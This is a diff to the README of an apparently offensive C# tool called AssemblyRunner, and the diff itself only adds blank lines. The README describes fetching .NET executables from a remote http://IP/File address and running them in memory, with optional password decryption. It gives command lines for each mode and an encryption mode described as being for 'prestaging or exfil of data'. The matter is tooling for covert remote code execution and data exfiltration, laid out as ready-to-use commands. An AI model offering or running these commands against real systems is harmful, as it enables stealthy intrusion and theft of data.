@@ -5,6 +5,7 @@ C# Binary that can encrypt files, decrypt files, as well as retreive files over 
 Overall goal was to be able to encrypt payload on remote system, transfer this binary, and then remotely retreive encrypted binary and execute in-memory
 
 Functionality
+
 .Net Exe Run in-memory with Arguments:
 
 --Run remote .net exe (remote exe is b64 no encryption)
@@ -18,6 +19,7 @@ AssemblyRunner.exe -rdec PASSWORD http://IP/File "Arguments"
 
 
 .Net Exe Run in-memory without Arguments:
+
 --Run remote .net exe (remote exe is b64 no encryption)
 AssemblyRunner.exe -netno http://IP/File(b64)
 
@@ -29,6 +31,7 @@ AssemblyRunner.exe -rdecno PASSWORD http://IP/File
 
 
 File Encryption only:
+
 --Encrypt Remote exe and download local, saved as encrypt_remote.txt
 AssemblyRunner.exe -enc PASSWORD http://IP/File
 --Encrypt Local File, used for prestaging or exfil of data, saved as encrypt_local.txt
